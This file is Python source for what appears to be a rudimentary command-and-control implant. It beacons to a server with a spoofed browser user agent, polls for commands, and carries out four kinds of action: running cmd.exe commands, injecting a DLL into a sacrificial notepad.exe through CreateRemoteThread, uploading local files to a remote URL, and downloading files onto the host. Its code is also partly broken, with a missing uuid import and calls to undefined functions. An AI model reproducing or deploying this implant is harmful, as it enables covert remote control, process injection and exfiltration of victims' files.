import subprocess
from subprocess import PIPE
import sys
from ctypes import *
import psutil
import requests
import time


def get_pid(process_name):
    """
    Takes in a process name
    Returns a process ID
    """
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            return proc.pid


def dll_inject(dll_path, sacrificial_process='notepad.exe'):
    """
    Taken from grayhat Python
    Adapted for our use
    Requires a DLL path and a sacrificial_process is optional.
    If no process name is provided, notepad.exe will be used
    """
    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
    pid = get_pid(sacrificial_process)
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)
    kernel32 = windll.kernel32

    dll_len = len(dll_path)
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        return f"[*] Couldn't acquire a handle to PID: {pid}"

    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
    # Write the DLL path into the allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
    # We need to resolve the address for LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
    # Now we try to create the remote thread, with the entry point set
    # to LoadLibraryA and a pointer to the DLL path as its single parameter
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        return "[*] Failed to inject the DLL. Exiting."
    else:
        return "[*] Remote thread created."


def cmdexe(beacon_command):
    """
    This takes in a string to execute
    Returns the output if any available
    """
    DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
    command = ['cmd.exe', '/C', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    return out


def upload(filePath, url="http://httpbin.org/post"):
    '''
    Takes in a URL and filepath
    '''
    uploadFile = open(filePath, 'rb')
    uploadUrl = url
    status = requests.post(uploadUrl, files={"Files": uploadFile})


def dwnld(url, ext):
    """
    This takes in a url and ext to download from
    The extension is required for when saving it
    """
    r = requests.get(url)
    open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)


GUID = uuid.uuid4()
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
    'APPSESSIONID':f'{GUID}'
}
# Send our HELLO/GUID
requests.get(f'http://127.0.0.1:5000/', headers=headers)
 
# Below is the cert requirements for mTLS when using requests
# , cert=('client.crt', 'client.key'), verify='ca.crt'
time.sleep(60)
while 1:
    a = requests.get(f'http://127.0.0.1:80/{GUID}.html', headers=headers)
    cmd = a.text
    print('got command')
    print(cmd)
    op = cmd.split(';')[0]
    cm = cmd.split(';')[1]
    ex = cmd.split(';')[2]
    enc = cmd.split(';')[3]

    if op == 'cmd':
        returned = bleh(cm)
        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
    if op == 'inject': # We can use mavinject from cmd prompt
        returned = bleh(cm)
        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
    if op == 'download':
        blehhhh(cm, ex)
    if op == 'upload':
        blehhh(cm, ex)
    else:
        print('nada')
    time.sleep(20)

